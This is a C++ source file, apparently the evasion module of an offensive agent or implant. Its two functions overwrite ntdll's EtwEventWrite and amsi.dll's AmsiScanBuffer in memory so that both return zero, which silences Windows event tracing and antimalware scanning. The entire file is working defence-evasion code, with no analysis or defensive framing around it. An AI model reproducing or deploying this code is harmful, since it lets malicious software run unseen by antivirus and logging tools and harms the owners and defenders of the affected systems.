#include "agent/modules/evasion/blinder.hpp"
#include <windows.h>
#include <iostream>

bool Blinder::BlindETW() {
    // Patch ntdll!EtwEventWrite to return 0
#ifdef _WIN64
    // 64-bit: xor rax, rax; ret
    unsigned char patch[] = { 0x48, 0x31, 0xC0, 0xC3 };
#else
    // 32-bit: xor eax, eax; ret 0x14
    unsigned char patch[] = { 0x31, 0xC0, 0xC2, 0x14, 0x00 };
#endif

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    void* pEtwEventWrite = (void*)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return false;

    DWORD oldProtect;
    if (VirtualProtect(pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy(pEtwEventWrite, patch, sizeof(patch));
        VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
        return true;
    }
    return false;
}

bool Blinder::BlindAMSI() {
    // Patch amsi!AmsiScanBuffer to return AMSI_RESULT_CLEAN (0)
#ifdef _WIN64
    // 64-bit: xor rax, rax; ret
    unsigned char patch[] = { 0x48, 0x31, 0xC0, 0xC3 };
#else
    // 32-bit: xor eax, eax; ret 0x18
    unsigned char patch[] = { 0x31, 0xC0, 0xC2, 0x18, 0x00 };
#endif

    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return false;

    void* pAmsiScanBuffer = (void*)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return false;

    DWORD oldProtect;
    if (VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy(pAmsiScanBuffer, patch, sizeof(patch));
        VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
        return true;
    }
    return false;
}
